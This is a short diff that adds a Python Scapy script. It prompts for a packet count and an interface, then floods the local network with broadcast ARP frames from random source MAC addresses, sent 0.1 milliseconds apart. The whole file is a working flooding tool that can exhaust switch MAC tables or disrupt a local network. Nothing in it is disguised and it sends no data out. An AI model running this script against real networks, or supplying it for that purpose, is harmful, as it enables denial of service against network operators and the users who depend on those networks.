@@ -1,0 +1,9 @@
+from scapy.all import *
+num = int(input("Enter the number of packets"))
+interface = input("Enter the Interface to flood")
+eth_pkt = Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
+arp_pkt = ARP(pdst='192.168.1.255',hwdst="ff:ff:ff:ff:ff:ff")
+try:
+    sendp(eth_pkt/arp_pkt,iface=interface,count =num, inter=.0001)
+except:
+    print("destination unreachable")
